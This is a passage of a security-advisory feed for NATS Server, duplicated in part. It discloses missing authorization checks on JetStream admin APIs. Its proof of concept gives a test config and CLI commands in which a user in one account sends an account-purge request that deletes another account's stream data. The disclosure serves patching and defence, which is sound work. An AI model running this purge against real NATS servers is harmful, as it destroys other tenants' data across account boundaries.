╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯

$ nats -s nats://localhost:4233 --user b --password b stream ls
No Streams defined

$ du -h tmp/jetstream
  0B	tmp/jetstream/TEST/streams/stream1/obs
8.0K	tmp/jetstream/TEST/streams/stream1/msgs
 16K	tmp/jetstream/TEST/streams/stream1
 16K	tmp/jetstream/TEST/streams
 16K	tmp/jetstream/TEST
 16K	tmp/jetstream

# User b (account TEST2) sends a PURGE command for account TEST (user a).
# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
11:54:50 Received with rtt 1.528042ms
{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}

# From nats-server in response to the purge request:
[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)

# And indeed, the stream data is gone on account TEST:
$ du -h tmp/jetstream
  0B	tmp/jetstream

$ nats -s nats://localhost:4233 --user a --password a stream ls
No Streams defined
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w">https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w</a></li>
<li><a href="https://advisories.nats.io/CVE/secnote-2025-01.txt">https://advisories.nats.io/CVE/secnote-2025-01.txt</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30215">https://nvd.nist.gov/vuln/detail/CVE-2025-30215</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/08/5">http://www.openwall.com/lists/oss-security/2025/04/08/5</a></li>
<li><a href="https://github.com/advisories/GHSA-fhg8-qxh5-7q3w">https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-15T21:45:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] NATS Server may fail to authorize certain Jetstream admin APIs]]></title>
        <id>https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</id>
        <link href="https://github.com/advisories/GHSA-fhg8-qxh5-7q3w"/>
        <updated>2025-04-16T13:12:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="advisory">Advisory</h2>
<p>The management of JetStream assets happens with messages in the <code>$JS.</code> subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.</p>
<p>Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>NATS Server:</p>
<ul>
<li>Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27</li>
</ul>
<hr>
<h2 id="original-report">Original Report</h2>
<p>(Lightly edited to confirm some supposition and in the summary to use past tense)</p>
<h3 id="summary">Summary</h3>
<p>nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.</p>
<p>In all cases, APIs are not properly restricted to system-account users. Instead, <em>any</em> authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on <code>$JS.&gt;</code>.</p>
<p>Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.</p>
<p>Reproduction of the <code>ACCOUNT.PURGE</code> case is below. The others are like it.</p>
<h3 id="details--impact">Details &amp; Impact</h3>
<h4 id="issue-1-jsapiaccountpurge">Issue 1: <code>$JS.API.ACCOUNT.PURGE.*</code></h4>
<p>Any user may perform an account purge of any other account (including their own).</p>
<p>Risk: total destruction of Jetstream configuration and data.</p>
<h4 id="issue-2-jsapiserverremove">Issue 2: <code>$JS.API.SERVER.REMOVE</code></h4>
<p>Any user may remove servers from Jetstream clusters.</p>
<p>Risk: Loss of data redundancy, reduction of service quality.</p>
<h4 id="issue-3-jsapiaccountstreammove-and-cancel_move">Issue 3: <code>$JS.API.ACCOUNT.STREAM.MOVE.*.*</code> and <code>CANCEL_MOVE</code></h4>
<p>Any user may cause streams to be moved between servers.</p>
<p>Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.</p>
<p>Similarly for <code>$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*</code></p>
<h4 id="mitigations">Mitigations</h4>
<p>It appears that users without permission to publish on <code>$JS.API.ACCOUNT.&gt;</code> or <code>$JS.API.SERVER.&gt;</code> are unable to execute the above APIs.</p>
<p>Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for <code>$JS.&gt;</code> (or simply <code>&gt;</code>), which allows the improper access to the system APIs above.</p>
<h4 id="scope-of-impact">Scope of impact</h4>
<p>Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.</p>
<p>While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.</p>
<h4 id="additional-notes">Additional notes</h4>
<p>It appears that <code>$JS.API.META.LEADER.STEPDOWN</code> does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.</p>
<h3 id="poc">PoC</h3>
<h4 id="environment">Environment</h4>
<p>Tested with:
nats-server 2.10.26 (installed via homebrew)
nats cli 0.1.6 (installed via homebrew)
macOS 13.7.4</p>
<h4 id="reproduction-steps">Reproduction steps</h4>
<pre><code>$ nats-server --version
nats-server: v2.10.26

$ nats --version
0.1.6

$ cat nats-server.conf
listen: '0.0.0.0:4233'
jetstream: {
  store_dir: './tmp'
}
accounts: {
  '$SYS': {
    users: [{user: 'sys', password: 'sys'}]
  },
  'TEST': {
    jetstream: true,
    users: [{user: 'a', password: 'a'}]
  },
  'TEST2': {
    jetstream: true,
    users: [{user: 'b', password: 'b'}]
  }
}

$ nats-server -c ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
...

# Authentication is effectively enabled by the server:
$ nats -s nats://localhost:4233 account info
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user sys --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user a --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user b --password wrong
nats: error: setup failed: nats: Authorization Violation

# Valid credentials work, and users properly matched to accounts:
$ nats -s nats://localhost:4233 account info --user sys --password sys
Account Information
                      User: sys
                   Account: $SYS
...

$ nats -s nats://localhost:4233 account info --user a --password a
Account Information
                           User: a
                        Account: TEST
...

$ nats -s nats://localhost:4233 account info --user b --password b
Account Information
                           User: b
                        Account: TEST2
...

# Add a stream and messages to account TEST (user 'a'):
$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
Stream stream1 was created
...

$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"

# Messages are correctly persisted on account TEST, and not on TEST2:
$ nats -s nats://localhost:4233 --user a --password a stream ls
╭───────────────────────────────────────────────────────────────────────────────╮
│                                    Streams                                    │
├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯

$ nats -s nats://localhost:4233 --user b --password b stream ls
No Streams defined

$ du -h tmp/jetstream
  0B	tmp/jetstream/TEST/streams/stream1/obs
8.0K	tmp/jetstream/TEST/streams/stream1/msgs
 16K	tmp/jetstream/TEST/streams/stream1
 16K	tmp/jetstream/TEST/streams
 16K	tmp/jetstream/TEST
 16K	tmp/jetstream

# User b (account TEST2) sends a PURGE command for account TEST (user a).
# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
11:54:50 Received with rtt 1.528042ms
{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}

# From nats-server in response to the purge request:
[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)

# And indeed, the stream data is gone on account TEST:
$ du -h tmp/jetstream
  0B	tmp/jetstream

$ nats -s nats://localhost:4233 --user a --password a stream ls
No Streams defined
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w">https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w</a></li>
<li><a href="https://advisories.nats.io/CVE/secnote-2025-01.txt">https://advisories.nats.io/CVE/secnote-2025-01.txt</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30215">https://nvd.nist.gov/vuln/detail/CVE-2025-30215</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/08/5">http://www.openwall.com/lists/oss-security/2025/04/08/5</a></li>
<li><a href="https://github.com/advisories/GHSA-fhg8-qxh5-7q3w">https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-15T21:45:00.000Z</published>
    </entry>
</feed>